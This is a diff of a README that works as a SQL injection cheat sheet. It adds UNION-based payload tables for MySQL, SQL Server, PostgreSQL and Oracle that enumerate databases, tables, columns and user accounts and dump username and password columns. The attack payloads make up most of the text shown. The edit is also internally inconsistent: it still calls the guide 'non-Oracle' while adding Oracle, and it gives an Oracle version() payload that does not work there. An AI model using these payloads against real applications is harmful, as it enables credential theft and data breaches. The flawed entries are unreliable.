@@ -1,6 +1,6 @@
 # SQL Injection Attack - Listing Database Contents on Non-Oracle Databases
 
-This README provides a comprehensive guide on performing **SQL injection attacks** to list database contents (e.g., tables, columns, and data) on **non-Oracle databases** such as **MySQL**, **SQL Server**, and **PostgreSQL**. The guide also covers techniques for retrieving database version information and includes preventive measures against these attacks.
+This README provides a comprehensive guide on performing **SQL injection attacks** to list database contents (e.g., tables, columns, and data) on **non-Oracle databases** such as **MySQL**, **SQL Server**, **PostgreSQL**, and others. The guide also covers techniques for retrieving database version information and includes preventive measures against these attacks.
 
 ---
 
@@ -11,24 +11,33 @@ This README provides a comprehensive guide on performing **SQL injection attacks
    - [Listing Columns in a Table](#listing-columns-in-a-table)
    - [Retrieving Data from a Table](#retrieving-data-from-a-table)
    - [Retrieve Database Version](#retrieve-database-version)
+   - [Other Commands](#other-commands)
 3. [SQL Injection in SQL Server](#sql-injection-in-sql-server)
    - [Listing Tables](#listing-tables-1)
    - [Listing Columns in a Table](#listing-columns-in-a-table-1)
    - [Retrieving Data from a Table](#retrieving-data-from-a-table-1)
    - [Retrieve Database Version](#retrieve-database-version-1)
+   - [Other Commands](#other-commands-1)
 4. [SQL Injection in PostgreSQL](#sql-injection-in-postgresql)
    - [Listing Tables](#listing-tables-2)
    - [Listing Columns in a Table](#listing-columns-in-a-table-2)
    - [Retrieving Data from a Table](#retrieving-data-from-a-table-2)
    - [Retrieve Database Version](#retrieve-database-version-2)
-5. [General SQL Injection Steps](#general-sql-injection-steps)
-6. [Prevention](#prevention)
+   - [Other Commands](#other-commands-2)
+5. [SQL Injection in Oracle](#sql-injection-in-oracle)
+   - [Listing Tables](#listing-tables-3)
+   - [Listing Columns in a Table](#listing-columns-in-a-table-3)
+   - [Retrieving Data from a Table](#retrieving-data-from-a-table-3)
+   - [Retrieve Database Version](#retrieve-database-version-3)
+   - [Other Commands](#other-commands-3)
+6. [General SQL Injection Steps](#general-sql-injection-steps)
+7. [Prevention](#prevention)
 
 ---
 
 ## Introduction
 
-SQL Injection (SQLi) is a critical security vulnerability that allows attackers to manipulate SQL queries by injecting malicious code into user inputs. This guide will explore common SQL injection methods used to retrieve database information like tables, columns, and data from **non-Oracle** databases, including **MySQL**, **SQL Server**, and **PostgreSQL**. It will also explain how to list the database version using these methods and how to protect against SQL injection attacks.
+SQL Injection (SQLi) is a critical security vulnerability that allows attackers to manipulate SQL queries by injecting malicious code into user inputs. This guide will explore common SQL injection methods used to retrieve database information like tables, columns, and data from **non-Oracle** databases, including **MySQL**, **SQL Server**, **PostgreSQL**, and **Oracle**. It will also explain how to list the database version using these methods and how to protect against SQL injection attacks.
 
 ---
 
@@ -42,6 +51,16 @@ MySQL databases store metadata in the **`information_schema`** database. You can
 | **Listing Columns in a Table** | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --` |
 | **Retrieving Data from a Table** | `' UNION SELECT username, password FROM users --`                                        |
 | **Retrieve Database Version**  | `' UNION SELECT version(), NULL --`                                                      |
+| **Listing Databases**          | `' UNION SELECT schema_name, NULL FROM information_schema.schemata --`                    |
+| **Checking User Privileges**   | `' UNION SELECT user(), NULL --`                                                         |
+
+### Other Commands in MySQL
+
+| **Action**                    | **SQL Injection Query**                                                                 |
+|-------------------------------|-----------------------------------------------------------------------------------------|
+| **Listing All Users**          | `' UNION SELECT user, NULL FROM mysql.user --`                                           |
+| **Finding Version Info**       | `' UNION SELECT @@version, NULL --`                                                      |
+| **Finding Database Version**   | `' UNION SELECT version(), NULL --`                                                      |
 
 ---
 
@@ -55,6 +74,16 @@ SQL Server uses system views like **`sys.tables`** and **`sys.columns`** to stor
 | **Listing Columns in a Table** | `' UNION SELECT name, NULL FROM sys.columns WHERE object_id = OBJECT_ID('users') --`      |
 | **Retrieving Data from a Table** | `' UNION SELECT username, password FROM users --`                                         |
 | **Retrieve Database Version**  | `' UNION SELECT @@VERSION, NULL --`                                                       |
+| **Listing Databases**          | `' UNION SELECT name, NULL FROM sys.databases --`                                         |
+| **Checking User Privileges**   | `' UNION SELECT user_name(), NULL --`                                                     |
+
+### Other Commands in SQL Server
+
+| **Action**                    | **SQL Injection Query**                                                                  |
+|-------------------------------|------------------------------------------------------------------------------------------|
+| **Listing All Users**          | `' UNION SELECT name, NULL FROM sys.syslogins --`                                         |
+| **Finding Version Info**       | `' UNION SELECT SERVERPROPERTY('ProductVersion'), NULL --`                               |
+| **Listing All Views**          | `' UNION SELECT name, NULL FROM sys.views --`                                             |
 
 ---
 
@@ -68,6 +97,38 @@ PostgreSQL stores its metadata in the **`pg_catalog`** schema. You can query thi
 | **Listing Columns in a Table** | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users' --` |
 | **Retrieving Data from a Table** | `' UNION SELECT username, password FROM users --`                                          |
 | **Retrieve Database Version**  | `' UNION SELECT version(), NULL --`                                                        |
+| **Listing Databases**          | `' UNION SELECT datname, NULL FROM pg_database --`                                        |
+| **Checking User Privileges**   | `' UNION SELECT current_user, NULL --`                                                    |
+
+### Other Commands in PostgreSQL
+
+| **Action**                    | **SQL Injection Query**                                                                  |
+|-------------------------------|------------------------------------------------------------------------------------------|
+| **Listing All Users**          | `' UNION SELECT usename, NULL FROM pg_user --`                                            |
+| **Finding Version Info**       | `' UNION SELECT version(), NULL --`                                                       |
+| **Listing All Schemas**        | `' UNION SELECT schema_name, NULL FROM information_schema.schemata --`                     |
+
+---
+
+## SQL Injection in Oracle
+
+Oracle databases use the **`ALL_TABLES`** and **`ALL_TAB_COLUMNS`** views to store metadata. You can use SQL injection to access these views.
+
+| **Action**                    | **SQL Injection Query**                                                                  |
+|-------------------------------|------------------------------------------------------------------------------------------|
+| **Listing Tables**             | `' UNION SELECT table_name, NULL FROM all_tables --`                                      |
+| **Listing Columns in a Table** | `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'users' --`    |
+| **Retrieving Data from a Table** | `' UNION SELECT username, password FROM users --`                                        |
+| **Retrieve Database Version**  | `' UNION SELECT banner, NULL FROM v$version --`                                          |
+| **Listing Databases**          | `' UNION SELECT owner, NULL FROM all_tables --`                                           |
+
+### Other Commands in Oracle
+
+| **Action**                    | **SQL Injection Query**                                                                  |
+|-------------------------------|------------------------------------------------------------------------------------------|
+| **Listing All Users**          | `' UNION SELECT username, NULL FROM all_users --`                                         |
+| **Finding Version Info**       | `' UNION SELECT version(), NULL --`                                                       |
+| **Listing All Views**          | `' UNION SELECT view_name, NULL FROM all_views --`                                        |
 
 ---
 
